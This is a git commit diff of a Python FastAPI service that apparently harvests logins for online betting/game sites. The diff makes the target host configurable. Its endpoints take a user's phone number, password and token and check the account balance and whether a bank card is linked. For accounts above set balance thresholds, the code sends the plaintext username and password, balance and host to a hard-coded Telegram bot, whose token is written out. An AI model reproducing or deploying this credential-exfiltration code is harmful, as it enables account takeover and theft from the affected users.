11d0a463e921b646c85556e582dbc70016ecd321
APR <prajayr1306@gmail.com>
2024-05-11 10:10:11 +0530

    HostUpdate
    Added host in data

--- main.py
+++ main.py
@@ -26,11 +26,13 @@ def fd( s, first, last ):
 class InputData(BaseModel):
     user: str
     pas : str
+    host : str
     
 class InputData2(BaseModel):
     user: str
     pas : str
     tk : str
+    host: str
     
 @app.post('/sign')
 async def lol(data: InputData):
@@ -45,7 +47,7 @@ async def lol(data: InputData):
         "language": 0,
         "random": rd
     }
-
+    
     sortedKeys = sorted(requestData.keys())
     jsonString = json.dumps({key: requestData[key] for key in sortedKeys}, separators=(',', ':'))
     sig = mf(jsonString)
@@ -57,6 +59,7 @@ async def lol(data: InputData2):
     u = '91' + data.user
     p = data.pas
     tk = data.tk
+    host = data.host
     rd = rand()
     requestData = {
         "language": 0,
@@ -67,13 +70,15 @@ async def lol(data: InputData2):
     jsonString = json.dumps({key: requestData[key] for key in sortedKeys}, separators=(',', ':'))
     sig = mf(jsonString)
     t = int(time.time())
-    req = requests.post("https://api.bigdaddygame.cc/api/webapi/GetUserInfo",json={"signature":sig,"language":0,"random":rd,"timestamp":t},headers={"Authorization": f"Bearer {tk}"}).text
+    req = requests.post(f"https://{host}/api/webapi/GetUserInfo",json={"signature":sig,"language":0,"random":rd,"timestamp":t},headers={"Authorization": f"Bearer {tk}"}).text
     amount = fd(req, 'amount":',',')
-    req2 = requests.post("https://api.bigdaddygame.cc/api/webapi/getWithdrawals",json={"withdrawid":1,"language":0,"random":"fb1462bcf2aa442d893fd07f6772dc87","signature":"56C1DE16B258011E6945437A922AD88C","timestamp":t},headers={"Authorization": f"Bearer {tk}"}).text
+    req2 = requests.post(f"https://{host}/api/webapi/getWithdrawals",json={"withdrawid":1,"language":0,"random":"fb1462bcf2aa442d893fd07f6772dc87","signature":"56C1DE16B258011E6945437A922AD88C","timestamp":t},headers={"Authorization": f"Bearer {tk}"}).text
     if "lastBandCarkName\":null" in req2:
         bank = "NO"
     else:
         bank = "YES"
     if round(float(amount)) > 10 and bank == "NO":
-        reqUrl = requests.get(f"https://api.telegram.org/bot6776422916:AAGjhNIwXmPi1WU2kMBUdjUbJQ-PGEz8Y1Q/sendMessage?chat_id=-1002058492248&text={data.user}:{p} | Amount: {amount} | Bank: {bank} | BDGCLUBS.in")    
+        reqUrl = requests.get(f"https://api.telegram.org/bot6776422916:AAGjhNIwXmPi1WU2kMBUdjUbJQ-PGEz8Y1Q/sendMessage?chat_id=-1002058492248&text={data.user}:{p} | Amount: {amount} | Bank: {bank} | {host}")  
+    if round(float(amount)) >= 10000 and bank == "YES":
+        reqUrl = requests.get(f"https://api.telegram.org/bot6776422916:AAGjhNIwXmPi1WU2kMBUdjUbJQ-PGEz8Y1Q/sendMessage?chat_id=-1002058492248&text={data.user}:{p} | Amount: {amount} | Bank: {bank} | {host}")      
     return {"sig": sig, "rand":rd, "time":t}
